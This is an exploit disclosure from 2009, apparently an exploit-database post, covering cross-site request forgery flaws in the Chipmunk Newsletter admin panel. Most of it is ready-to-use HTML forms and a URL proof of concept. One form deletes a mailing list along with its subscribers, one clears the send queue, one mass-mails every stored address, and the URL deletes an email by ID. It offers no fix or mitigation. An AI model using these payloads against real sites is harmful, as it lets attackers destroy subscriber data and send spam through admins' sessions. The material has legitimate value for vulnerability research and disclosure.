Chipmunk Newsletter CSRF Vulnerabilities 
========================================

[-------------------------------------------------------------------------------------------------]
[   Title: Chipmunk Newsletter CSRF Vulnerabilities                                               ]
[   Author: Milos Zivanovic                                                                       ]
[   Date: 11. December 2009.                                                                      ]
[-------------------------------------------------------------------------------------------------]
 
[-------------------------------------------------------------------------------------------------]
[   Application: Chipmunk Newsletter                                                              ]
[   Version: the only one there is                                                                ]
[   Download: http://www.chipmunk-scripts.com/newsletter/newsletter.zip                           ]
[   Vulnerability: Cross Site Request Forgery                                                     ]
[-------------------------------------------------------------------------------------------------]
 
I&#039;ve noticed one XSS exploit was found by someone else so i decided to check it a little bit more
and i found some sweet CSRF exploits in admin panel.
 
[#]Content
 |--CSRF Delete Email List (also will remove all mails subscribed to this list)
 |--CSRF Clear Queue (Set all send to zero?)
 |--CSRF Send letter (this will mass mail all mails in database)
 |--CSRF Delete Email by ID
 
[-]CSRF Delete Email List (also will remove all mails subscribed to this list)
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form action="http://localhost/newsletter/admin/dellist.php" method="POST">
  <select name=&#039;lists&#039;>
    <option value=&#039;3&#039;>newsletter_list</option>
  </select>
  <input type=&#039;submit&#039; name=&#039;submit&#039; value=&#039;Delete&#039;>
</form>
 
[EXPLOIT------------------------------------------------------------------------------------------]
 
[-]CSRF Clear Queue (Set all send to zero?)
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form action="http://localhost/newsletter/admin/clearqueue.php" method="POST">
  <input type="submit" name="submit">
</form>
 
[EXPLOIT------------------------------------------------------------------------------------------]
 
[-]CSRF Send letter (this will mass mail all mails in database)
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form action="http://localhost/newsletter/admin/sendletter.php" method="POST">
  <input type=&#039;text&#039; name=&#039;subject&#039; value="Mail Subject">
  <select name=&#039;lists&#039;>
    <option value=&#039;0&#039; selected>All</option>
  </select>
  <textarea name=&#039;nletter&#039; rows=&#039;8&#039; cols=&#039;60&#039; id=&#039;7&#039;>Mail message here</textarea>
   
  <input type=&#039;submit&#039; name=&#039;submit&#039; value=&#039;submit&#039;>
</form>
 
[EXPLOIT------------------------------------------------------------------------------------------]
 
[-]CSRF Delete Email by ID
 
[POC----------------------------------------------------------------------------------------------]
http://localhost/newsletter/admin/deleteadd.php?ID=[ID]
[POC----------------------------------------------------------------------------------------------]



